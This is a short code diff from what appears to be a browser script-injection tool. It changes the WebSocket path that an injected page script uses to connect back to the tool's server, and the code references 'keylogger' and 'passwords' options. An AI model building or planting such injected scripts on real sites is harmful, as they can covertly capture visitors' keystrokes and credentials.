@@ -122,8 +122,8 @@ export default (query: any) => {
       let injectScript
 
       if (inject) {
-        let websocket = `'${wss}'+p+'i/websocket?${injectProject}'`
-        if (query.passwords === 'false' && keylogger === false) websocket = `'${wss}${proxy}i/websocket?${injectProject}'`
+        let websocket = `'${wss}'+p+'i?${injectProject}'`
+        if (query.passwords === 'false' && keylogger === false) websocket = `'${wss}${proxy}i?${injectProject}'`
         body += `
           function u() {` + comment('Open a new websocket to the server') + `
             window.ws = new WebSocket(` + websocket + `)
